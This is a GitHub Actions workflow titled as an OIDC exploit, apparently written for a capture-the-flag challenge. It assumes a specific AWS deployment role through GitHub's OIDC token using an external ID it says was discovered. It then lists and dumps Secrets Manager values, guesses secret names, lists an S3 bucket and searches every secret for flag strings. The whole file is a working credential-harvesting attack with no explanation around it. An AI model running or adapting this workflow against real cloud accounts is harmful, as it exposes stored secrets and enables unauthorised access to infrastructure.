name: FINAL OIDC EXPLOIT - With Discovered Secrets

on:
  workflow_dispatch:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Configure AWS Credentials with Discovered Secrets
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
        aws-region: us-west-1
        role-session-name: GitHubOIDCExploit
        role-external-id: "internal/secrets/id-v2"
        
    - name: Verify AWS Access
      run: |
        echo "ðŸŽ‰ AWS ACCESS SUCCESSFUL!"
        aws sts get-caller-identity
        
    - name: List Secrets Manager Secrets
      run: |
        echo "Listing available secrets..."
        aws secretsmanager list-secrets --region us-west-1
        
    - name: Access Target Secret
      run: |
        echo "Accessing the target secret for privileged credentials..."
        # Try the secret ID we discovered
        aws secretsmanager get-secret-value --secret-id "internal/secrets" --region us-west-1 || echo "Secret not found"
        
        # Try common patterns
        for secret in "hexnova404-flag" "final-flag" "privileged-role" "deployment-secrets" "ctf-flag"; do
          echo "Trying secret: $secret"
          aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 2>/dev/null || echo "Not found: $secret"
        done
        
    - name: Check S3 Bucket Access
      run: |
        echo "Checking S3 bucket access..."
        aws s3 ls s3://ci-deployment-logsv1/ --region us-west-1 || echo "S3 access failed"
        
    - name: Search for Flag
      run: |
        echo "ðŸ SEARCHING FOR FLAG..."
        # Get all secrets and search for flag patterns
        aws secretsmanager list-secrets --region us-west-1 --query 'SecretList[*].Name' --output text | tr '\t' '\n' | while read secret; do
          echo "Checking secret: $secret"
          value=$(aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 --query 'SecretString' --output text 2>/dev/null)
          if [[ "$value" =~ [Dd][Cc]33|[Ff]lag ]]; then
            echo "ðŸŽ¯ POTENTIAL FLAG FOUND in $secret: $value"
          fi
        done
